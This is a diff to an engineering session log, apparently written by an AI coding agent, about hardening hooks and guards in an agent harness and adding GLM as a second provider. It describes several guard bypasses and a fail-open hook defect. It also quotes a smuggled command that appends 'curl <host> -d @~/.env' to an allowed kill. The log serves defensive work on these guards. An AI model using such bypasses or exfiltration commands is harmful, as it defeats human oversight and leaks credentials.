@@ -4,6 +4,56 @@ Summary log of terminal actions and outcomes. Full history archived in `archive/
 
 ---
 
+## 09/11/2026
+
+### CH-237 + CE-2: the controls refused what they claimed, and two of them could not fail
+
+| Time | Action | Result |
+|------|--------|--------|
+| - | Grace's review and two QA rounds drove CH-237.3/.4/.6/.7/.8 to accepted. Every fix is paired with a test proven to go red when the defect is restored | 245 hook tests, 619 ticket tests, 218 claude-env fixtures |
+| - | **CH-237.8 was a deadlock, not a hole.** Narrowing gate 4 to `-m`'s operand closed four evasions and made six of the eight spellings git accepts unreadable — `git commit -am "fix(X): real"` yielded an empty message and was refused for naming no ticket. QA bounced it twice; the second time found the parsing byte-identical to the bounced commit | Token-aware cluster parsing; `-c/-C/-t/-S/-u` operands still refused as messages |
+| - | **CH-237.6's tests could not fail.** They asserted on `permissionDecision`, a field that same story stopped the hook emitting. QA mutated the trigger back to the old broad regex and all six stayed green while the hook leaked its reminder onto `git log --grep commit` | Rewritten to assert silence; the mutation now reds 4 |
+| - | **CH-237.4 shipped with no instrument.** `FLAGS_TAKING_A_VALUE` grew four entries and reverting them produced zero failures across the whole suite | Four value-flag wrapper rows plus a read-only control; the revert now reds 4 |
+| - | CH-237.9: ci_cost_guard adopted the shared parser and resolves the target repo per statement. The permanent macOS ban had been chosen by whichever directory Claude Code started in | 25 fixtures; all four new BLOCK cases returned rc=0 against the pre-change guard |
+| - | CE-2.14/2.15: the worktree guard stopped crashing open on a non-string subagent_type, and the five roles its criterion names each got their own fixture. The old evidence was a `general-purpose` fixture that could not fail if a role were re-added | QA built six mutants and confirmed each fixture reds only for its own role |
+
+**A hole in a guard I wrote the same night, caught by CSO at the release gate:**
+`orphan_process_guard` prints one command to clear its block and promises that
+kill is the only thing allowed. `is_sweep` anchored the pattern at the start of
+the string, so `kill <pid> && curl <host> -d @~/.env` was accepted as a sweep.
+Three of four hostile forms passed. Worse than an ordinary bypass, because the
+guard hands the agent the command — it was not permitting the smuggler, it was
+dictating it. Fixed under CE-2.18 with a token allowlist (CE-2.17 stays
+accepted; Patrick: *"we don't re-open things like this"*).
+
+**GLM became a working second provider.** Z.AI's Anthropic-compatible endpoint
+through `glm-agent`. Board cards now show the model that actually served a run
+rather than the tier assigned at filing — `sonnet zai` described a worker that
+never existed. Up to five agents ran at once across two boards and two
+providers, GLM writing and reviewing while Claude verified. A GLM reviewer found
+ten real ways past ci_cost_guard; all ten confirmed by execution, all
+pre-existing, filed as CH-237.10.
+
+**Provider headroom is not interrogable.** Anthropic returns full
+`anthropic-ratelimit-*` headers; Z.AI returns none and has no quota endpoint —
+and the Anthropic numbers describe the API-key wallet, not the subscription
+dispatched workers spend from. No honest comparator exists. Confirmed
+separately that `api.z.ai/api/anthropic` is the Coding Plan endpoint, so GLM use
+draws on subscription quota and stops at exhaustion rather than falling through
+to wallet balance.
+
+**Filed, not fixed:** CH-237.10 (ten ci_cost_guard bypasses; four live in
+`_repo_context`, shared by 28 hooks, and hole #4 is pinned by an existing
+deliberate test — that one needs Patrick's call), CH-224.31 (the board gives no
+sign a worker is live on a story).
+
+**The lesson that cost the most time:** five stories' changes were batched into
+two working trees before anything was committed, so every commit tripped over
+another story's dirty files. The guards were working as designed — the docstring
+names that cost as accepted. Commit one story at a time.
+
+---
+
 ## 08/30/2026
 
 ### CE-5: eleven copies of the shared rules became one file (claude-env + 9 repos)
@@ -1089,3 +1139,46 @@ CH-166 token-vocabulary decision is the one thing genuinely blocked on Patrick.
 
 - Shipped: OM-29.4 no-zoom-buttons-on-mobile + the two specs (Haiku-written, reviewer-verified against the live registry) via release PR #29; develop==main, deploy verified. Backlogs pruned across omni-map/claude-env (one stale chore routed and accepted); harness board deliberately left for a session with Patrick.
 - Session ends for the new Claude update. Patrick: "the board should be the state of the work" - session files are orientation, boards are truth.
+
+## 2026-09-10 — GLM as a second worker type (claude-harness)
+
+Goal, Patrick's: sub in a GLM agent for work; start by registering GLM as a
+dispatchable agent. Design doc `claude-harness/docs/design/008-glm-as-a-second-provider.md`.
+NOTHING COMMITTED — the doc, `hooks/_deny.py` and a scratchpad runner are all
+uncommitted on `develop`.
+
+- **No fork needed.** Z.AI publishes an Anthropic-compatible endpoint. A
+  `claude -p --settings <file>` subprocess with an `env` block runs the whole
+  harness (plugin, skills, agents, `ticket` on PATH) against GLM while the
+  parent session stays on Claude. Verified: `model=glm-5.3` on the wire.
+- **Two usable models, not ten.** The catalogue advertises 10; all of them alias
+  onto `glm-5.3` or `glm-5.3-flash`. `glm-4.5-flash` is distinct but measured
+  ~4x the output tokens and far slower; `glm-4.5v` is vision-only. The requested
+  model name is NOT evidence — only the response's `model` field is.
+- **Three tiers come from effort, not model choice.** `output_config.effort=low`
+  drops a turn from 2223 to 293 output tokens (thinking off entirely); `max` is
+  within noise of baseline. So: big = glm-5.3 thinking on, medium = glm-5.3
+  effort:low, small = glm-5.3-flash. `budget_tokens` and `reasoning.effort` are
+  silently IGNORED (accepted, no effect).
+- **Billing is credits, not tokens.** 12K/5h, 60K/week. Claude Code's
+  `total_cost_usd` is ~20x wrong for GLM runs (Claude price table applied to GLM
+  tokens) — the trust scoreboard must count tokens/credits, never USD. Whole
+  session cost 15 credits. Prompt caching works (29,888 of 30,019 from cache).
+- **BLOCKER FOUND — the gates fail OPEN under `claude -p`.** Hooks load and run;
+  their refusal is discarded (`Hook output does not start with {, treating as
+  plain text` -> `permissionBehavior=allow`). A subprocess wrote a bogus ticket
+  into the live store with no refusal. Interactive fails closed, `-p` fails open.
+  Isolated with paired scratch hooks: exit-2+stderr ignored, JSON
+  `permissionDecision: "deny"` honoured.
+- **Fix written and verified, deliberately NOT wired:** `hooks/_deny.py` emits
+  both protocols from one place, exit 2 preserved. Fanning it across ten
+  security gates + their exit-code tests needs Patrick's call and a ticket.
+  Plugin also runs from pinned cache 0.5.1, so it needs a version bump +
+  reinstall to take effect. No GLM agent gets write access until this lands.
+- **Second, unrelated hole:** `ticket_bash_guard.py` matches literal store paths
+  but not `"$STORE/x.json"`. Debug shows `tree-sitter unavailable, using legacy
+  shell-quote path`. Wants its own ticket, near the CH-237.x parser work.
+- Store is clean; both probe tickets removed. `ZAI_API_KEY` in
+  `claude-harness/.env` (0600, gitignored) — arrived via chat, worth rotating.
+- Process: Patrick called out, twice, posing questions then proceeding without
+  answers. Memory `feedback_a_question_ends_the_turn` written.
